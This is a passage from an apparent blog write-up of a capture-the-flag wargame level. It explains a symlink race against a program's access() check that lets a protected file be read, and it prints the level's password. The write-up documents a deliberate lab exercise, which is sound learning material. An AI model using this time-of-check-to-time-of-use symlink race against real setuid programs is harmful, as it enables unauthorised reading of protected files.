<li><code>rm /tmp/l1ge/lev3</code> - Deletes <em>lev3</em></li>
</ul>
<p>To sum up, every 0.1 seconds it creates a file with permissions that can pass the <em>access()</em> function, symlinks it to the file we really wanna access, deletes it and start all over again.</p>
<p>My plan is to run <code>./printfile</code> on my <em>lev3</em> file repeatedly until it magically sync up perfectly and the symlink happens right between <em>access()</em> reads the permissions and it gets passed to <code>cat</code> to print its content.</p>
<p>And to do that without a script, I'll use my fingers</p>
<p>I fire-up another <code>tmux</code> window and here I go, hitting UP ARROW and ENTER as fast I can to execute randomly the command on repeat.</p>
<pre><code class="language-bash">$ ./printfile /tmp/l1ge/lev3
</code></pre>
<p>...until I hope the password magically appears. When you find yourself doing something so stupid on a CTF,  a strong inner voice tells you to give up and never touch a computer again.</p>
<p>BUT in less than 1mn the magic happened, that's fast enough to bypass my own pessimism.</p>
<p><img src="/image/leviathan2.jpg" alt=""></p>
<p>Our password is  <strong>Ahdiemoo1j</strong></p>
<p>There is of course a most reliable way to solve this level and you can check the other write-ups about it.</p>
<p>Hope you enjoyed!</p>
<p>Cheers,
l1ge.</p></content>
  </entry>
</feed>
